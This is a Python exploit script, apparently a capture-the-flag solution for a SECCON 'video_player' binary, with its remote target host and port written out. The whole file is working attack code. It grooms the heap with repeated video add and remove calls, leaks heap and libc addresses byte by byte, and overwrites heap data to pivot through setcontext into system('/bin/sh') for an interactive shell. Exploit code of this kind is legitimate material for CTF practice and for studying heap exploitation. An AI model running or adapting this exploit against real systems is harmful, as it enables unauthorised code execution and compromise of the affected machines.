#!/usr/bin/env python
# coding:utf-8

from ctf import *

binary = './video_player'
context.log_level= 'INFO'
mode = args['MODE'].lower()
if args['LIB'].lower() != 'system':
    os.environ['LD_LIBRARY_PATH'] = os.curdir

elf = context.binary = ELF(binary)
libc = [x for x in elf.libs.keys() if 'libc.so' in x]
libc = ELF(libc and libc[0] or './libc.so.6')

def exploit():
    if mode == 'debug':
        io = debug(binary)
        io.b([
            # 0x0000000000402211, # append sub
        ])
        io.r()
    elif mode == 'remote':
        io = remote('video_player.pwn.seccon.jp', 7777)
    elif mode == 'qira':
        io = remote('0', 4000)
    else:
        io = process(binary)

    def add_video(resolution='', fps='', frame_count=None, frames='\x8d', description=''):
        io.sendlineafter('>>> ', 1)
        io.sendlineafter('>>> ', 1)
        io.sendlineafter(':', resolution)
        io.sendlineafter(':', fps)
        if frame_count is None:
            frame_count = len(frames)
        io.sendafter(':', p32(frame_count))
        io.sendafter(':', frames)
        io.sendlineafter(':', description)

    def add_subtitle(data, length=None, append=False):
        io.sendlineafter('>>> ', 1)
        io.sendlineafter('>>> ', 3)
        if not append:
            io.sendlineafter(':', '1')
        if length is None:
            length = len(data)
        io.sendafter(':', p32(length))
        io.sendafter(':', data)

    def play_clip(index):
        io.sendlineafter('>>> ', 3)
        io.sendline(index)

    def remove_clip(index):
        io.sendlineafter('>>> ', 4)
        io.sendline(index)

    io.sendline('name')

    fast_0x60_count = 37
    for i in xrange(0x100):
        add_video(frames=cyclic(0x10))
    for i in xrange(0x300 - fast_0x60_count):
        add_video(frames=cyclic(i + 1))
    for i in xrange(fast_0x60_count):
        add_video(frames=cyclic(0x50))
    for i in xrange(0x400 - fast_0x60_count, 0x400):
        remove_clip(i)

    add_video(frames='\x8d' * 0x210)
    add_video(frames='\x8d' * 0x210)
    add_video(frames='\x8d' * 0x210)
    add_video(frames='\x8d' * 0x210)
    remove_clip(0x400)
    remove_clip(0x402)

    leaked = ''
    for i in xrange(15):
        length = 1 + i
        index = 0x404 + i * 2
        add_video(frame_count=0x210, frames='\x8d' * length)
        play_clip(index)
        io.recvline_endswith('...')
        io.recv(length)
        leaked += xor(io.recv(1), 0xcc)
        remove_clip(index)

        # restore chunk order
        add_video(frame_count=0x210)
        remove_clip(index + 1)

    current_heap_base = u64(leaked[-8:]) - 0x440
    log.info('heap base after filling: %#x', current_heap_base)
    libc.address = u64('\x58' + leaked[:7]) - 0x3c4b58
    log.info('libc base address: %#x', libc.address)

    remove_clip(0x401)
    add_video()
    add_video()
    add_video()
    remove_clip(0x424)
    remove_clip(0x423)
    remove_clip(0x422)

    add_subtitle('A' * 0x10)
    add_video(frames='A' * 0x30)
    add_subtitle(fit({
        0x10: current_heap_base + 0x78,
        0x10 + 0x18: libc.symbols['setcontext'] + 0x35,
        0x10 + 0xa0: current_heap_base, # rsp, anywhere writable
        0x10 + 0xa8: libc.symbols['system'], # push rcx -> ret addr
        0x10 + 0x68: libc.search('/bin/sh').next(), # rdi
    }), 0xfffffff8, append=True)
    remove_clip(0x426)

    if mode == 'debug':
        io.interrupt()
        io.sendlines('''
            parseheap
        #'''.strip().split('\n'))

    # io.sendline('cat /home/*/flag*')
    io.interactive()

if __name__ == '__main__':
    exploit()
